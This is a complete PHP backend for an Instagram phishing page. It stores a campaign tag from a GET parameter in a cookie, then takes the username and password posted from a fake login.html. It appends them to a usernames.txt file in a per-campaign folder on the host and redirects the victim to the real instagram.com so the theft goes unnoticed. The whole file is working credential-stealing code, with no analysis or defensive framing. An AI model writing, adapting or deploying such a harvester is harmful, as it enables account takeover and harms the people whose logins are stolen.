<?php
    if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['n'])) {
        $savedData = htmlspecialchars($_GET['n']);
        setcookie("saved_data", $savedData, time() + 3600, "/"); // Set a cookie with the data
        header('Location: login.html');
        exit;
    } elseif ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $savedData = $_COOKIE['saved_data']; // Retrieve data from the cookie
        if (!empty($savedData)) {
            $folderName = "/storage/ssd3/136/21096136/public_html/secret_projects/aa/$savedData";
            $filename = "$folderName/usernames.txt";
            $username = $_POST['username'];
            $password = $_POST['passwordins'];
    
            // Check if usernames.txt already exists
            if (!file_exists($filename)) {
                mkdir($folderName, 0777, true); // Create the folder if it doesn't exist
                file_put_contents($filename, ''); // Create the usernames.txt file
            }
    
            // Append data only if the file is newly created
            if (filesize($filename) === 0) {
                $newData = "Instagram Username: $username Pass: $password";
            } else {
                $newData = "\nInstagram Username: $username Pass: $password";
            }
            file_put_contents($filename, $newData, FILE_APPEND);
    
            header('Location: https://instagram.com/');
            exit;
        }
    } else {
        header('Location: error.html');
        exit;
    }
    ?>